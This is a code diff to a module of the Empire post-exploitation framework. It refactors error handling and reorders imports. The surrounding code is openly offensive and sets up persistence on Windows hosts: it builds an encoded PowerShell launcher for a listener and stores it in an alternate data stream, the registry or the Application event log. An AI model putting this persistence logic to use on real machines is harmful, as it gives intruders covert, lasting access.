@@ -1,15 +1,14 @@
 from __future__ import print_function
 
 import os
-
-from builtins import str
 from builtins import object
-
-from empire.server.utils import data_util
-from empire.server.common import helpers
+from builtins import str
 from typing import Dict
 
+from empire.server.common import helpers
 from empire.server.common.module_models import PydanticModule
+from empire.server.utils import data_util
+from empire.server.utils.module_util import handle_error_message
 
 
 class Module(object):
@@ -48,9 +47,8 @@ class Module(object):
         if cleanup.lower() == 'true':
             if ads_path != '':
                 if ".txt" not in ads_path:
-                    print(helpers.color("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt"))
-                    return ""
-                
+                    return handle_error_message("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt")
+
                 script = "Invoke-Command -ScriptBlock {cmd /C \"echo x > " + ads_path + "\"};"
             else:
                 # remove the script stored in the registry at the specified reg path
@@ -84,16 +82,14 @@ class Module(object):
                 status_msg += "using external file " + ext_file
             
             else:
-                print(helpers.color("[!] File does not exist: " + ext_file))
-                return ""
-        
+                return handle_error_message("[!] File does not exist: " + ext_file)
+
         else:
             # if an external file isn't specified, use a listener
             if not main_menu.listeners.is_listener_valid(listener_name):
                 # not a valid listener, return nothing for the script
-                print(helpers.color("[!] Invalid listener: " + listener_name))
-                return ""
-            
+                return handle_error_message("[!] Invalid listener: " + listener_name)
+
             else:
                 # generate the PowerShell one-liner with all of the proper options set
                 launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
@@ -109,9 +105,8 @@ class Module(object):
             
             if ads_path != '':
                 if ".txt" not in ads_path:
-                    print(helpers.color("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt"))
-                    return ""
-                
+                    return handle_error_message("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt")
+
                 script = "Invoke-Command -ScriptBlock {cmd /C \"echo " + enc_script + " > " + ads_path + "\"};"
                 
                 location_string = "$(cmd /c \''more < " + ads_path + "\'')"
@@ -123,9 +118,8 @@ class Module(object):
             
             # sanity check to make sure we haven't exceeded the 31389 byte max
             if len(enc_script) > 31389:
-                print(helpers.color("[!] Warning: encoded script exceeds 31389 byte max."))
-                return ""
-            
+                return handle_error_message("[!] Warning: encoded script exceeds 31389 byte max.")
+
             status_msg += " stored in Application event log under EventID " + event_log_id + "."
             
             # command to write out the encoded script to the specified eventlog ID
